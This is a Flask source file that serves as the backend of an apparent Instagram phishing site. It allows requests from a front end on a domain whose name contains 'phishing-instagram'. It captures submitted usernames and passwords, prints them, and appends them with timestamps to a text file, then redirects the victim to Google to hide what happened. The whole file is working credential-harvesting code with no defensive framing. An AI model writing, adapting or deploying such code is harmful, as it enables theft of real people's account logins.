from flask import Flask, render_template, request, redirect
from datetime import datetime
from flask_cors import CORS


app = Flask(__name__)

CORS(app, resources={r"/*": {"origins": ["https://phishing-instagram-liard.vercel.app/"]}})

@app.route("/", methods=['GET', 'POST'])
def hello_world():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"login attempt - Username: {username}\nPassword: {password}")
        
    
        with open('create.txt', 'a') as f:
            f.write(f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n")
            
        print(f"Login attempt saved - Username: {username}")
        print(f"Login attempt saved - password: {password}")
    
        return redirect("https://www.google.com")
    

if __name__ == "__main__":
    app.run(debug=True, port=1111)



